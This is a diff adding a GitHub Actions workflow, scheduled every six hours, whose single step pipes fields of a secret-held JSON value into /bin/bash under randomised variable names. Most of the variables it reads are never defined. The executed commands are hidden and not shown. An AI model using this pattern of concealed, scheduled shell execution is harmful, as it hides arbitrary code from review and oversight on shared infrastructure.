@@ -1,0 +1,24 @@
+name: daoxiaozaolv
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: daoxiaozaolv
+        env:
+          klp66940: ${{ secrets.klp66940 }}
+        run: |
+          echo $klp66940 | jq -r .idq79 | /bin/bash
+          echo $gkq48 | jq -r .sygbm51645 | /bin/bash
+          echo $nxohx3 | jq -r .y4 | /bin/bash
+          echo $ebms8 | jq -r .gkl73 | /bin/bash
+          echo $gteoj44367 | jq -r .dbpzd8352 | /bin/bash
+          echo $f5050 | jq -r .gu737 | /bin/bash
+          echo $m87 | jq -r .gtxm582 | /bin/bash
+          echo $mst571 | jq -r .t4 | /bin/bash
+
